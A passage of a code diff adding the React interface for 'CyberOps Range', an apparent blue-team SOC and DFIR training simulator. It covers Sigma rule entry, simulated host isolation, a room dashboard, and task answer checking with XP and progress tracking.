+                  className=&quot;w-full p-2 rounded bg-slate-900 border border-slate-800 font-mono text-xs text-slate-100&quot;
+                  placeholder=&quot;Detection condition...&quot;
+                /&gt;
+                &lt;button
+                  type=&quot;button&quot;
+                  onClick={() =&gt; {
+                    if (!ruleTitle.trim() || !rulePattern.trim()) return;
+                    onAddSigmaRule({
+                      id: Date.now(),
+                      roomId: room.id,
+                      title: ruleTitle.trim(),
+                      pattern: rulePattern.trim()
+                    });
+                  }}
+                  className=&quot;px-3 py-1.5 rounded-lg bg-indigo-500/20 text-indigo-200 border border-indigo-500/40 hover:bg-indigo-500/30 text-xs font-medium transition&quot;
+                &gt;
+                  Deploy Rule to Lab Feed
+                &lt;/button&gt;
+                {progress.sigmaRules.length &gt; 0 &amp;&amp; (
+                  &lt;div className=&quot;pt-2 space-y-1.5&quot;&gt;
+                    &lt;span className=&quot;text-[11px] text-slate-400 block&quot;&gt;Deployed Rules ({progress.sigmaRules.length})&lt;/span&gt;
+                    {progress.sigmaRules.slice(-3).map((r) =&gt; (
+                      &lt;div key={r.id} className=&quot;p-2 rounded bg-slate-900 border border-slate-800 text-xs&quot;&gt;
+                        &lt;div className=&quot;font-semibold text-emerald-300&quot;&gt;{r.title}&lt;/div&gt;
+                        &lt;div className=&quot;font-mono text-[11px] text-slate-400 truncate&quot;&gt;{r.pattern}&lt;/div&gt;
+                      &lt;/div&gt;
+                    ))}
+                  &lt;/div&gt;
+                )}
+              &lt;/div&gt;
+
+              &lt;div className=&quot;p-3 rounded-lg bg-slate-950/90 border border-slate-800 space-y-3&quot;&gt;
+                &lt;span className=&quot;text-xs font-semibold text-rose-300 uppercase tracking-wider block&quot;&gt;
+                  EDR Host Containment
+                &lt;/span&gt;
+                &lt;p className=&quot;text-xs text-slate-400 leading-relaxed&quot;&gt;
+                  Isolate compromised endpoints from non-management network traffic once key indicators are confirmed.
+                &lt;/p&gt;
+                &lt;div className=&quot;flex items-center gap-2&quot;&gt;
+                  &lt;select
+                    value={targetHost}
+                    onChange={(e) =&gt; setTargetHost(e.target.value)}
+                    className=&quot;flex-1 px-2.5 py-1.5 rounded bg-slate-900 border border-slate-800 text-xs text-slate-100&quot;
+                  &gt;
+                    {availableHosts.map((h) =&gt; (
+                      &lt;option key={h} value={h}&gt;{h}&lt;/option&gt;
+                    ))}
+                  &lt;/select&gt;
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; onToggleContain(targetHost)}
+                    className={`px-3 py-1.5 rounded-lg text-xs font-semibold border transition ${
+                      isHostContained
+                        ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 hover:bg-emerald-500/30'
+                        : 'bg-rose-500/20 text-rose-200 border-rose-500/40 hover:bg-rose-500/30'
+                    }`}
+                  &gt;
+                    {isHostContained ? 'Release Isolation' : 'Isolate Host'}
+                  &lt;/button&gt;
+                &lt;/div&gt;
+                &lt;div className=&quot;p-2.5 rounded bg-slate-900 border border-slate-800 text-xs&quot;&gt;
+                  Status for &lt;span className=&quot;font-mono text-slate-200&quot;&gt;{targetHost}&lt;/span&gt;:{' '}
+                  {isHostContained ? (
+                    &lt;span className=&quot;text-rose-400 font-semibold&quot;&gt;CONTAINED (Network Quarantined)&lt;/span&gt;
+                  ) : (
+                    &lt;span className=&quot;text-emerald-400 font-semibold&quot;&gt;ACTIVE / UNCONTAINED&lt;/span&gt;
+                  )}
+                &lt;/div&gt;
+              &lt;/div&gt;
+            &lt;/div&gt;
+          )}
+        &lt;/div&gt;
+      );
+    }
+
+    // ============================================================================
+    // MAIN APPLICATION
+    // ============================================================================
+
+    function CyberOpsSOCSimulator() {
+      const [progress, setProgress] = useState(() =&gt; {
+        try {
+          const saved = localStorage.getItem(STORAGE_KEY);
+          if (saved) {
+            const parsed = JSON.parse(saved);
+            return {
+              ...DEFAULT_PROGRESS,
+              ...parsed,
+              completedTasks: Array.isArray(parsed.completedTasks) ? parsed.completedTasks : [],
+              completedRooms: Array.isArray(parsed.completedRooms) ? parsed.completedRooms : [],
+              containedHosts: Array.isArray(parsed.containedHosts) ? parsed.containedHosts : [],
+              sigmaRules: Array.isArray(parsed.sigmaRules) ? parsed.sigmaRules : [],
+              skills: { ...DEFAULT_PROGRESS.skills, ...(parsed.skills || {}) }
+            };
+          }
+        } catch {
+          // ignore storage errors
+        }
+        return DEFAULT_PROGRESS;
+      });
+
+      const [view, setView] = useState('dashboard'); // 'dashboard' | 'lab' | 'skills'
+      const [activeRoomId, setActiveRoomId] = useState(ROOMS[0].id);
+      const [tierFilter, setTierFilter] = useState('All');
+      const [searchQuery, setSearchQuery] = useState('');
+
+      const [openTaskId, setOpenTaskId] = useState(ROOMS[0].tasks[0].id);
+      const [taskInputs, setTaskInputs] = useState({});
+      const [taskFeedback, setTaskFeedback] = useState({});
+      const [revealedHints, setRevealedHints] = useState({});
+      const [demoAssist, setDemoAssist] = useState(false);
+      const [certificateRoom, setCertificateRoom] = useState(null);
+      const [confirmReset, setConfirmReset] = useState(false);
+
+      useEffect(() =&gt; {
+        try {
+          localStorage.setItem(STORAGE_KEY, JSON.stringify(progress));
+        } catch {
+          // ignore storage errors
+        }
+      }, [progress]);
+
+      const activeRoom = useMemo(
+        () =&gt; ROOMS.find((r) =&gt; r.id === activeRoomId) || ROOMS[0],
+        [activeRoomId]
+      );
+
+      const nextRecommendedRoom = useMemo(() =&gt; {
+        return ROOMS.find((r) =&gt; !progress.completedRooms.includes(r.id)) || ROOMS[ROOMS.length - 1];
+      }, [progress.completedRooms]);
+
+      const rankInfo = useMemo(() =&gt; getRankForXP(progress.xp), [progress.xp]);
+
+      const filteredRooms = useMemo(() =&gt; {
+        return ROOMS.filter((r) =&gt; {
+          const matchesTier = tierFilter === 'All' || r.tier === tierFilter;
+          const q = searchQuery.trim().toLowerCase();
+          const matchesQuery =
+            !q ||
+            r.title.toLowerCase().includes(q) ||
+            r.id.toLowerCase().includes(q) ||
+            r.category.toLowerCase().includes(q) ||
+            r.mitre.some((m) =&gt; m.toLowerCase().includes(q));
+          return matchesTier &amp;&amp; matchesQuery;
+        });
+      }, [tierFilter, searchQuery]);
+
+      const openRoom = (roomId) =&gt; {
+        const target = ROOMS.find((r) =&gt; r.id === roomId) || ROOMS[0];
+        setActiveRoomId(target.id);
+        setOpenTaskId(target.tasks[0]?.id || null);
+        setView('lab');
+      };
+
+      const handleSubmitAnswer = (room, task) =&gt; {
+        if (progress.completedTasks.includes(task.id)) {
+          setTaskFeedback((prev) =&gt; ({
+            ...prev,
+            [task.id]: { ok: true, msg: 'Already completed! XP already awarded.' }
+          }));
+          return;
+        }
+
+        const raw = (taskInputs[task.id] || '').trim();
+        if (!raw) {
+          setTaskFeedback((prev) =&gt; ({
+            ...prev,
+            [task.id]: { ok: false, msg: 'Enter an answer or flag before submitting.' }
+          }));
+          return;
+        }
+
+        const normalizedGuess = raw.toLowerCase().replace(/\\+/g, '/');
+        const isCorrect = task.accepted.some(
+          (acc) =&gt; acc.trim().toLowerCase().replace(/\\+/g, '/') === normalizedGuess
+        );
+
+        if (!isCorrect) {
+          setTaskFeedback((prev) =&gt; ({
+            ...prev,
+            [task.id]: { ok: false, msg: 'Not quite. Check the logs/terminal or use the Hint.' }
+          }));
+          return;
+        }
+
+        const updatedCompletedTasks = [...progress.completedTasks, task.id];
+        const roomAllDone = room.tasks.every((t) =&gt; updatedCompletedTasks.includes(t.id));
+        const newlyCompletedRoom = roomAllDone &amp;&amp; !progress.completedRooms.includes(room.id);
+        const updatedCompletedRooms = newlyCompletedRoom
+          ? [...progress.completedRooms, room.id]
+          : progress.completedRooms;
+
+        const nextSkills = { ...progress.skills };
+        SKILL_DOMAINS.forEach((d) =&gt; {
+          const roomBoost = room.skills[d.key] || 0;
+          const inc = Math.max(3, Math.round((roomBoost / room.tasks.length) * 0.65));
+          nextSkills[d.key] = Math.min(100, (nextSkills[d.key] || 10) + inc);
+        });
+
+        const bonusXP = newlyCompletedRoom ? 60 : 0;
+        const gainedXP = task.xp + bonusXP;
+
+        setProgress((prev) =&gt; ({
+          ...prev,
+          xp: prev.xp + gainedXP,
+          completedTasks: updatedCompletedTasks,
+          completedRooms: updatedCompletedRooms,
+          skills: nextSkills
+        }));
+
+        setTaskFeedback((prev) =&gt; ({
+          ...prev,
+          [task.id]: {
+            ok: true,
+            msg: newlyCompletedRoom
+              ? `Correct! +${gainedXP} XP (includes +60 XP Room Completion Bonus)`
+              : `Correct! +${task.xp} XP`
+          }
+        }));
+
+        const idx = room.tasks.findIndex((t) =&gt; t.id === task.id);
+        if (idx &gt;= 0 &amp;&amp; idx + 1 &lt; room.tasks.length) {
+          setOpenTaskId(room.tasks[idx + 1].id);
+        }
+
+        if (newlyCompletedRoom) {
+          setCertificateRoom(room);
+        }
+      };
+
+      const handleToggleContain = (host) =&gt; {
+        setProgress((prev) =&gt; {
+          const exists = prev.containedHosts.includes(host);
+          return {
+            ...prev,
+            containedHosts: exists
+              ? prev.containedHosts.filter((h) =&gt; h !== host)
+              : [...prev.containedHosts, host]
+          };
+        });
+      };
+
+      const handleAddSigmaRule = (rule) =&gt; {
+        setProgress((prev) =&gt; ({
+          ...prev,
+          xp: prev.xp + 25,
+          sigmaRules: [...prev.sigmaRules, rule],
+          skills: {
+            ...prev.skills,
+            detectionEng: Math.min(100, (prev.skills.detectionEng || 10) + 4)
+          }
+        }));
+      };
+
+      const handleResetProgress = () =&gt; {
+        setProgress(DEFAULT_PROGRESS);
+        setTaskInputs({});
+        setTaskFeedback({});
+        setRevealedHints({});
+        setCertificateRoom(null);
+        setConfirmReset(false);
+        try {
+          localStorage.removeItem(STORAGE_KEY);
+        } catch {
+          // ignore
+        }
+      };
+
+      return (
+        &lt;div className=&quot;min-h-screen bg-slate-950 text-slate-100 flex flex-col&quot;&gt;
+          {/* TOP NAVIGATION HUD */}
+          &lt;header className=&quot;sticky top-0 z-30 bg-slate-950/90 backdrop-blur border-b border-slate-800/90&quot;&gt;
+            &lt;div className=&quot;max-w-7xl mx-auto px-4 py-3 flex flex-wrap items-center justify-between gap-3&quot;&gt;
+              &lt;div className=&quot;flex items-center gap-3&quot;&gt;
+                &lt;button
+                  type=&quot;button&quot;
+                  onClick={() =&gt; setView('dashboard')}
+                  className=&quot;flex items-center gap-2.5 text-left group&quot;
+                &gt;
+                  &lt;div className=&quot;w-9 h-9 rounded-lg bg-cyan-500/15 border border-cyan-500/40 flex items-center justify-center text-cyan-400 group-hover:bg-cyan-500/25 transition&quot;&gt;
+                    &lt;Shield className=&quot;w-5 h-5&quot; /&gt;
+                  &lt;/div&gt;
+                  &lt;div&gt;
+                    &lt;div className=&quot;font-bold text-sm sm:text-base tracking-tight text-white flex items-center gap-1.5&quot;&gt;
+                      CyberOps Range
+                      &lt;span className=&quot;text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-cyan-500/15 text-cyan-300 border border-cyan-500/30&quot;&gt;
+                        SOC Lab
+                      &lt;/span&gt;
+                    &lt;/div&gt;
+                    &lt;p className=&quot;text-[11px] text-slate-400 hidden sm:block&quot;&gt;
+                      Hands-On Blue Team &amp;amp; DFIR Practice Platform
+                    &lt;/p&gt;
+                  &lt;/div&gt;
+                &lt;/button&gt;
+
+                &lt;nav className=&quot;flex items-center gap-1 ml-2 sm:ml-6&quot;&gt;
+                  {[
+                    { id: 'dashboard', label: 'Rooms', icon: LayoutDashboard },
+                    { id: 'lab', label: 'Active Lab', icon: Terminal },
+                    { id: 'skills', label: 'Skills &amp; Badges', icon: Award }
+                  ].map((item) =&gt; {
+                    const Icon = item.icon;
+                    const active = view === item.id;
+                    return (
+                      &lt;button
+                        key={item.id}
+                        type=&quot;button&quot;
+                        onClick={() =&gt; setView(item.id)}
+                        className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition ${
+                          active
+                            ? 'bg-slate-800 text-cyan-300 border border-slate-700'
+                            : 'text-slate-400 hover:text-slate-100 hover:bg-slate-900'
+                        }`}
+                      &gt;
+                        &lt;Icon className=&quot;w-3.5 h-3.5&quot; /&gt;
+                        &lt;span&gt;{item.label}&lt;/span&gt;
+                      &lt;/button&gt;
+                    );
+                  })}
+                &lt;/nav&gt;
+              &lt;/div&gt;
+
+              {/* OPERATOR RANK &amp; XP */}
+              &lt;div className=&quot;flex items-center gap-3&quot;&gt;
+                &lt;div className=&quot;hidden md:flex flex-col items-end&quot;&gt;
+                  &lt;div className=&quot;flex items-center gap-2 text-xs&quot;&gt;
+                    &lt;span className={`font-semibold px-2 py-0.5 rounded border ${rankInfo.current.badge} ${rankInfo.current.color}`}&gt;
+                      {rankInfo.current.name}
+                    &lt;/span&gt;
+                    &lt;span className=&quot;font-mono text-cyan-300 font-semibold&quot;&gt;{progress.xp} XP&lt;/span&gt;
+                  &lt;/div&gt;
+                  &lt;div className=&quot;w-36 h-1.5 bg-slate-800 rounded-full overflow-hidden mt-1&quot;&gt;
+                    &lt;div
+                      className=&quot;h-full bg-gradient-to-r from-cyan-400 to-indigo-400 transition-all duration-300&quot;
+                      style={{ width: `${rankInfo.progressPct}%` }}
+                    /&gt;
+                  &lt;/div&gt;
+                &lt;/div&gt;
+                {confirmReset ? (
+                  &lt;div className=&quot;flex items-center gap-1.5 bg-slate-900 border border-rose-500/40 rounded-lg px-2 py-1 text-xs&quot;&gt;
+                    &lt;span className=&quot;text-rose-300&quot;&gt;Reset?&lt;/span&gt;
+                    &lt;button
+                      type=&quot;button&quot;
+                      onClick={handleResetProgress}
+                      className=&quot;px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-200 hover:bg-rose-500/30 font-semibold&quot;
+                    &gt;
+                      Yes
+                    &lt;/button&gt;
+                    &lt;button
+                      type=&quot;button&quot;
+                      onClick={() =&gt; setConfirmReset(false)}
+                      className=&quot;px-1.5 py-0.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700&quot;
+                    &gt;
+                      No
+                    &lt;/button&gt;
+                  &lt;/div&gt;
+                ) : (
+                  &lt;button
+                    type=&quot;button&quot;
+                    onClick={() =&gt; setConfirmReset(true)}
+                    title=&quot;Reset saved progress&quot;
+                    className=&quot;p-2 rounded-lg bg-slate-900 border border-slate-800 text-slate-400 hover:text-rose-300 hover:border-rose-500/40 transition&quot;
+                  &gt;
+                    &lt;RotateCcw className=&quot;w-4 h-4&quot; /&gt;
+                  &lt;/button&gt;
+                )}
+              &lt;/div&gt;
+            &lt;/div&gt;
+          &lt;/header&gt;
+
+          {/* MAIN CONTENT */}
+          &lt;main className=&quot;flex-1 max-w-7xl w-full mx-auto px-4 py-6&quot;&gt;
+            {view === 'dashboard' &amp;&amp; (
+              &lt;div className=&quot;space-y-6&quot;&gt;
+                {/* HERO BANNER */}
+                &lt;section className=&quot;rounded-2xl bg-gradient-to-br from-slate-900 via-slate-900 to-cyan-950/30 border border-slate-800 p-5 sm:p-7 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-6&quot;&gt;
+                  &lt;div className=&quot;space-y-2.5 max-w-2xl&quot;&gt;
+                    &lt;div className=&quot;inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 text-xs font-medium&quot;&gt;
+                      &lt;Zap className=&quot;w-3.5 h-3.5&quot; /&gt;
+                      Beginner to Expert Scenarios • Educational Simulation
+                    &lt;/div&gt;
+                    &lt;h1 className=&quot;text-2xl sm:text-3xl font-bold tracking-tight text-white&quot;&gt;
+                      Practice Real-World SOC Triage, Log Hunting &amp;amp; DFIR
+                    &lt;/h1&gt;
+                    &lt;p className=&quot;text-sm text-slate-300 leading-relaxed&quot;&gt;
+                      Work through structured multi-stage rooms with simulated SIEM telemetry, an interactive Linux/DFIR terminal, CyberChef-Lite decoding, threat intel lookups, and Sigma/EDR containment actions.
+                    &lt;/p&gt;
+                  &lt;/div&gt;
+
+                  &lt;div className=&quot;flex flex-col sm:flex-row lg:flex-col items-stretch sm:items-center lg:items-end gap-3 shrink-0&quot;&gt;
+                    &lt;button
+                      type=&quot;button&quot;
+                      onClick={() =&gt; openRoom(nextRecommendedRoom.id)}
+                      className=&quot;inline-flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-xs sm:text-sm transition shadow-lg shadow-cyan-500/15&quot;
+                    &gt;
+                      &lt;Play className=&quot;w-4 h-4 fill-current&quot; /&gt;
+                      &lt;span&gt;Resume: {nextRecommendedRoom.id} — {nextRecommendedRoom.title}&lt;/span&gt;
+                    &lt;/button&gt;
+                    &lt;div className=&quot;flex items-center gap-4 text-xs text-slate-400&quot;&gt;
+                      &lt;span&gt;
+                        Rooms Done:{' '}
+                        &lt;strong className=&quot;text-slate-100&quot;&gt;
+                          {progress.completedRooms.length}/{ROOMS.length}
+                        &lt;/strong&gt;
+                      &lt;/span&gt;
+                      &lt;span&gt;
+                        Tasks Solved:{' '}
+                        &lt;strong className=&quot;text-slate-100&quot;&gt;
+                          {progress.completedTasks.length}/{ROOMS.reduce((acc, r) =&gt; acc + r.tasks.length, 0)}
+                        &lt;/strong&gt;
+                      &lt;/span&gt;
+                    &lt;/div&gt;
+                  &lt;/div&gt;
+                &lt;/section&gt;
+
+                {/* FILTERS */}
+                &lt;section className=&quot;flex flex-col md:flex-row md:items-center justify-between gap-3&quot;&gt;
+                  &lt;div className=&quot;flex flex-wrap items-center gap-1.5&quot;&gt;
+                    {['All', ...TIERS.map((t) =&gt; t.id)].map((t) =&gt; (
+                      &lt;button
+                        key={t}
+                        type=&quot;button&quot;
+                        onClick={() =&gt; setTierFilter(t)}
+                        className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition ${
+                          tierFilter === t
+                            ? 'bg-cyan-500/15 text-cyan-300 border-cyan-500/40'
+                            : 'bg-slate-900/70 text-slate-400 border-slate-800 hover:text-slate-200'
+                        }`}
+                      &gt;
+                        {t === 'All' ? 'All Tiers' : t}
+                      &lt;/button&gt;
+                    ))}
+                  &lt;/div&gt;
+
+                  &lt;div className=&quot;relative w-full md:w-72&quot;&gt;
+                    &lt;Search className=&quot;w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2&quot; /&gt;
+                    &lt;input
+                      type=&quot;text&quot;
+                      value={searchQuery}
+                      onChange={(e) =&gt; setSearchQuery(e.target.value)}
+                      placeholder=&quot;Search room, MITRE ID, or topic...&quot;
+                      className=&quot;w-full pl-9 pr-3 py-2 rounded-lg bg-slate-900 border border-slate-800 text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-cyan-500&quot;
+                    /&gt;
+                  &lt;/div&gt;
+                &lt;/section&gt;
+
+                {/* ROOM GRID */}
+                &lt;section className=&quot;grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4&quot;&gt;
+                  {filteredRooms.map((room) =&gt; {
+                    const tierMeta = TIERS.find((t) =&gt; t.id === room.tier);
+                    const style = TIER_STYLES[tierMeta?.accent || 'cyan'];
+                    const solvedCount = room.tasks.filter((t) =&gt;
+                      progress.completedTasks.includes(t.id)
+                    ).length;
+                    const isCompleted = progress.completedRooms.includes(room.id);
+
+                    return (
+                      &lt;div
+                        key={room.id}
+                        className={`rounded-xl bg-slate-900/80 border border-slate-800 ${style.border} p-4 flex flex-col justify-between gap-4 transition`}
+                      &gt;
+                        &lt;div className=&quot;space-y-2.5&quot;&gt;
+                          &lt;div className=&quot;flex items-center justify-between gap-2&quot;&gt;
+                            &lt;span className=&quot;font-mono text-xs font-semibold text-cyan-400&quot;&gt;
+                              {room.id}
+                            &lt;/span&gt;
+                            &lt;div className=&quot;flex items-center gap-1.5&quot;&gt;
+                              &lt;span className={`text-[11px] px-2 py-0.5 rounded border ${style.badge}`}&gt;
+                                {room.tier}
+                              &lt;/span&gt;
+                              {isCompleted &amp;&amp; (
+                                &lt;span className=&quot;inline-flex items-center gap-1 text-[11px] px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30&quot;&gt;
+                                  &lt;CheckCircle2 className=&quot;w-3 h-3&quot; /&gt;
+                                  Done
+                                &lt;/span&gt;
+                              )}
+                            &lt;/div&gt;
+                          &lt;/div&gt;
+
+                          &lt;h2 className=&quot;text-base font-bold text-white leading-snug&quot;&gt;
+                            {room.title}
+                          &lt;/h2&gt;
+                          &lt;p className=&quot;text-xs text-slate-400 leading-relaxed&quot;&gt;
+                            {room.summary}
+                          &lt;/p&gt;
+
+                          &lt;div className=&quot;flex flex-wrap gap-1.5 pt-1&quot;&gt;
+                            {room.mitre.map((tech) =&gt; (
+                              &lt;span
+                                key={tech}
+                                className=&quot;font-mono text-[10px] px-2 py-0.5 rounded bg-slate-950 text-slate-300 border border-slate-800&quot;
+                              &gt;
+                                {tech}
+                              &lt;/span&gt;
+                            ))}
+                          &lt;/div&gt;
+                        &lt;/div&gt;
+
+                        &lt;div className=&quot;space-y-3 pt-2 border-t border-slate-800/80&quot;&gt;
+                          &lt;div className=&quot;flex items-center justify-between text-[11px] text-slate-400&quot;&gt;
+                            &lt;span&gt;
+                              Tasks: &lt;strong className=&quot;text-slate-200&quot;&gt;{solvedCount}/{room.tasks.length}&lt;/strong&gt;
+                            &lt;/span&gt;
+                            &lt;span&gt;{room.estTime}&lt;/span&gt;
+                            &lt;span className=&quot;font-mono text-cyan-300&quot;&gt;+{room.xp} XP&lt;/span&gt;
+                          &lt;/div&gt;
+
+                          &lt;button
+                            type=&quot;button&quot;
+                            onClick={() =&gt; openRoom(room.id)}
+                            className=&quot;w-full py-2 px-3 rounded-lg bg-slate-800 hover:bg-cyan-500/20 text-slate-100 hover:text-cyan-200 border border-slate-700 hover:border-cyan-500/40 text-xs font-semibold flex items-center justify-center gap-1.5 transition&quot;
+                          &gt;
+                            &lt;span&gt;{solvedCount &gt; 0 ? 'Continue Lab' : 'Launch Lab'}&lt;/span&gt;
+                            &lt;ArrowRight className=&quot;w-3.5 h-3.5&quot; /&gt;
+                          &lt;/button&gt;
+                        &lt;/div&gt;
+                      &lt;/div&gt;
+                    );
+                  })}
+                &lt;/section&gt;
+              &lt;/div&gt;
+            )}
+
+            {view === 'lab' &amp;&amp; (
+              &lt;div className=&quot;space-y-4&quot;&gt;
+                {/* LAB HEADER BAR */}
+                &lt;div className=&quot;rounded-xl bg-slate-900/90 border border-slate-800 p-4 flex flex-wrap items-center justify-between gap-3&quot;&gt;
+                  &lt;div className=&quot;space-y-1&quot;&gt;
+                    &lt;div className=&quot;flex flex-wrap items-center gap-2&quot;&gt;
+                      &lt;button
+                        type=&quot;button&quot;
+                        onClick={() =&gt; setView('dashboard')}
+                        className=&quot;text-xs text-cyan-400 hover:underline&quot;
+                      &gt;
+                        ← All Rooms
+                      &lt;/button&gt;
+                      &lt;span className=&quot;text-slate-600&quot;&gt;/&lt;/span&gt;
+                      &lt;span className=&quot;font-mono text-xs text-slate-400&quot;&gt;{activeRoom.id}&lt;/span&gt;
+                      &lt;span className=&quot;text-xs px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700&quot;&gt;
+                        {activeRoom.difficulty} • {activeRoom.category}
+                      &lt;/span&gt;
+                    &lt;/div&gt;
+                    &lt;h1 className=&quot;text-lg sm:text-xl font-bold text-white&quot;&gt;{activeRoom.title}&lt;/h1&gt;
+                    &lt;p className=&quot;text-xs text-slate-300 max-w-3xl&quot;&gt;{activeRoom.briefing}&lt;/p&gt;
+                  &lt;/div&gt;
+
+                  &lt;div className=&quot;flex items-center gap-2.5&quot;&gt;
+                    &lt;label className=&quot;inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs text-slate-300 cursor-pointer&quot;&gt;
+                      &lt;input
+                        type=&quot;checkbox&quot;
+                        checked={demoAssist}
+                        onChange={(e) =&gt; setDemoAssist(e.target.checked)}
+                        className=&quot;rounded border-slate-700 bg-slate-900 text-cyan-500&quot;
+                      /&gt;
+                      &lt;span&gt;Show Example Answers&lt;/span&gt;
+                    &lt;/label&gt;
+                    &lt;select
+                      value={activeRoom.id}
+                      onChange={(e) =&gt; openRoom(e.target.value)}
+                      className=&quot;px-2.5 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs text-slate-200&quot;
+                    &gt;
+                      {ROOMS.map((r) =&gt; (
+                        &lt;option key={r.id} value={r.id}&gt;
+                          {r.id}: {r.title}
+                        &lt;/option&gt;
+                      ))}
+                    &lt;/select&gt;
+                  &lt;/div&gt;
+                &lt;/div&gt;
+
+                {/* SPLIT PANE: TASKS LEFT + WORKBENCH RIGHT */}
+                &lt;div className=&quot;grid grid-cols-1 lg:grid-cols-12 gap-4 items-start&quot;&gt;
+                  &lt;div className=&quot;lg:col-span-5 space-y-2.5&quot;&gt;
+                    {activeRoom.tasks.map((task, idx) =&gt; {
+                      const isOpen = openTaskId === task.id;
+                      const isSolved = progress.completedTasks.includes(task.id);
+                      const fb = taskFeedback[task.id];
+                      const hintVisible = !!revealedHints[task.id];
+
+                      return (
+                        &lt;div
+                          key={task.id}
+                          className={`rounded-xl border transition overflow-hidden ${
+                            isSolved
+                              ? 'bg-emerald-950/20 border-emerald-500/30'
+                              : isOpen
+                              ? 'bg-slate-900 border-cyan-500/40'
+                              : 'bg-slate-900/70 border-slate-800'
+                          }`}
+                        &gt;
+                          &lt;button
+                            type=&quot;button&quot;
+                            onClick={() =&gt; setOpenTaskId(isOpen ? null : task.id)}
+                            className=&quot;w-full px-4 py-3 flex items-center justify-between gap-2 text-left&quot;
+                          &gt;
+                            &lt;div className=&quot;flex items-center gap-2.5 min-w-0&quot;&gt;
+                              {isSolved ? (
+                                &lt;CheckCircle2 className=&quot;w-4 h-4 text-emerald-400 shrink-0&quot; /&gt;
+                              ) : (
+                                &lt;span className=&quot;w-5 h-5 rounded-full bg-slate-800 text-slate-300 text-[11px] font-mono flex items-center justify-center shrink-0&quot;&gt;
+                                  {idx + 1}
+                                &lt;/span&gt;
+                              )}
+                              &lt;span className=&quot;text-xs sm:text-sm font-semibold text-white truncate&quot;&gt;
+                                {task.title}
+                              &lt;/span&gt;
+                            &lt;/div&gt;
+                            &lt;div className=&quot;flex items-center gap-2 shrink-0&quot;&gt;
+                              &lt;span className=&quot;font-mono text-[11px] text-cyan-300&quot;&gt;+{task.xp} XP&lt;/span&gt;
+                              {isOpen ? (
+                                &lt;ChevronDown className=&quot;w-4 h-4 text-slate-400&quot; /&gt;
+                              ) : (
+                                &lt;ChevronRight className=&quot;w-4 h-4 text-slate-400&quot; /&gt;
+                              )}
+                            &lt;/div&gt;
+                          &lt;/button&gt;
+
+                          {isOpen &amp;&amp; (
+                            &lt;div className=&quot;px-4 pb-4 pt-1 space-y-3 border-t border-slate-800/70&quot;&gt;
+                              &lt;p className=&quot;text-xs text-slate-200 leading-relaxed&quot;&gt;{task.prompt}&lt;/p&gt;
+
+                              {demoAssist &amp;&amp; (
+                                &lt;div className=&quot;p-2 rounded bg-amber-500/10 border border-amber-500/30 text-[11px] font-mono text-amber-200&quot;&gt;
+                                  Example answer: {task.example}
+                                &lt;/div&gt;
+                              )}
+
+                              {hintVisible &amp;&amp; (
+                                &lt;div className=&quot;p-2 rounded bg-indigo-500/10 border border-indigo-500/30 text-xs text-indigo-200&quot;&gt;
+                                  &lt;strong&gt;Hint:&lt;/strong&gt; {task.hint}
+                                &lt;/div&gt;
+                              )}
+
+                              &lt;div className=&quot;flex flex-col sm:flex-row gap-2&quot;&gt;
+                                &lt;input
+                                  type=&quot;text&quot;
+                                  value={taskInputs[task.id] ?? (isSolved ? task.answer : '')}
+                                  onChange={(e) =&gt;
+                                    setTaskInputs((prev) =&gt; ({ ...prev, [task.id]: e.target.value }))
+                                  }
+                                  onKeyDown={(e) =&gt; {
+                                    if (e.key === 'Enter') handleSubmitAnswer(activeRoom, task);
+                                  }}
+                                  placeholder=&quot;Enter answer...&quot;
+                                  className=&quot;flex-1 px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-700 font-mono text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-cyan-500&quot;
+                                /&gt;
+                                &lt;button
+                                  type=&quot;button&quot;
+                                  onClick={() =&gt; handleSubmitAnswer(activeRoom, task)}
+                                  className=&quot;px-3.5 py-1.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold text-xs transition shrink-0&quot;
+                                &gt;
+                                  Submit
+                                &lt;/button&gt;
+                              &lt;/div&gt;
+
+                              &lt;div className=&quot;flex items-center justify-between&quot;&gt;
+                                &lt;button
+                                  type=&quot;button&quot;
+                                  onClick={() =&gt;
+                                    setRevealedHints((prev) =&gt; ({ ...prev, [task.id]: !prev[task.id] }))
+                                  }
+                                  className=&quot;inline-flex items-center gap-1 text-[11px] text-slate-400 hover:text-cyan-300&quot;
+                                &gt;
+                                  &lt;HelpCircle className=&quot;w-3.5 h-3.5&quot; /&gt;
+                                  &lt;span&gt;{hintVisible ? 'Hide Hint' : 'Need a Hint?'}&lt;/span&gt;
+                                &lt;/button&gt;
+                                {progress.completedRooms.includes(activeRoom.id) &amp;&amp; (
+                                  &lt;button
+                                    type=&quot;button&quot;
+                                    onClick={() =&gt; setCertificateRoom(activeRoom)}
+                                    className=&quot;text-[11px] text-emerald-400 hover:underline font-medium&quot;
+                                  &gt;
+                                    View Debrief Summary
+                                  &lt;/button&gt;
+                                )}
+                              &lt;/div&gt;
+
+                              {fb &amp;&amp; (
+                                &lt;div
+                                  className={`text-xs font-medium px-2.5 py-1.5 rounded border ${
+                                    fb.ok
+                                      ? 'bg-emerald-500/10 text-emerald-300 border-emerald-500/30'
+                                      : 'bg-rose-500/10 text-rose-300 border-rose-500/30'
+                                  }`}
+                                &gt;
+                                  {fb.msg}
+                                &lt;/div&gt;
+                              )}
